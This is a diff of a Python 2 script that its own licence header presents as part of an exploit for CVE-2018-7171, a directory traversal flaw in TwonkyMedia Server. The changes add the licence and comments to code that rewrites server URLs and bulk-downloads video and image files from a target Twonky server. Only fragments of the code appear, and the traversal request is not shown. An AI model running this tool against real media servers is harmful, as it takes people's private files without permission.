@@ -1,7 +1,52 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 '''
-author: @mezdanak, modzero AG, https://www.modzero.ch, @mod0
+* ------------------------------------------------------------------------------
+ *
+ * This file is part of: TwonkyMedia Server 7.0.11-8.5 Directory Traversal CVE-2018-7171
+ *
+ * ------------------------------------------------------------------------------
+ *
+ * BSD 3-Clause License
+ *
+ * Copyright (c) 2018, Sven Fassbender
+ * Author: Sven Fassbender
+ * All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions are met:
+ *
+ * * Redistributions of source code must retain the above copyright notice, this
+ *   list of conditions and the following disclaimer.
+ *
+ * * Redistributions in binary form must reproduce the above copyright notice,
+ *   this list of conditions and the following disclaimer in the documentation
+ *   and/or other materials provided with the distribution.
+ *
+ * * Neither the name of the copyright holder nor the names of its
+ *   contributors may be used to endorse or promote products derived from
+ *   this software without specific prior written permission.
+ *
+ * * NON-MILITARY-USAGE CLAUSE
+ *   Redistribution and use in source and binary form for military use and
+ *   military research is not permitted. Infringement of these clauses may
+ *   result in publishing the source code of the utilizing applications and
+ *   libraries to the public. As this software is developed, tested and
+ *   reviewed by *international* volunteers, this clause shall not be refused
+ *   due to the matter of *national* security concerns.
+ *  
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+ * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+ * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+ * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+ * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+ * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+ * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+ * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+ * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ *
+ * ------------------------------------------------------------------------------
 '''
 try:
 	import requests
@@ -15,7 +60,7 @@ except:
 
 def downloadWorker(tree, twonkyServer, downloadPath):
 	for child in tree.iter("res"):
-		if "LRG" in child.text or "AVI" in child.text or "MOV" in child.text:
+		if "LRG" in child.text or "AVI" in child.text or "MOV" in child.text: # Change resolution here available options LRG, SML, MED
 			url = child.text.replace("127.0.0.1",twonkyServer)
 			splited = url.split("/")
 			splitedTwo = splited[len(splited)-1]
@@ -37,6 +82,7 @@ def downloadWorker(tree, twonkyServer, downloadPath):
 			
 	return
 
+# Fetch files from TwonkyMedia Server
 def downloadFiles(twonky, twonkyServer, downloadPath):
 	twonkyFolderStart = twonky.find("#")
 	if twonkyFolderStart != -1:
@@ -68,7 +114,7 @@ def downloadFiles(twonky, twonkyServer, downloadPath):
 		print "*** Invalid Url! ***"
 		sys.exit()
 
-
+# Create the URL
 def createTwonkyUrl(twonky, twonkyServer, twonkyFolderStart):
 	twonkyUrl = twonky[twonkyFolderStart+1:]
 	twonkyUrlFindOne = twonkyUrl.find(":9000")
@@ -85,6 +131,7 @@ def createTwonkyUrl(twonky, twonkyServer, twonkyFolderStart):
 		print "*** Invalid Url! ***"
 		sys.exit()
 
+# Check if the local directory exists
 def checkCreateDir(downloadPath, twonkyServer):
 	directory = downloadPath + twonkyServer
 	if not os.path.exists(directory):
@@ -98,6 +145,7 @@ def checkCreateDir(downloadPath, twonkyServer):
 		print "*** Directory %s found. ***" %directory
 	return directory
 
+# Program start here
 def main():
 	if len(sys.argv) != 2 :
 		print "Usage: " + sys.argv[0] + " [Downloadpath]'"
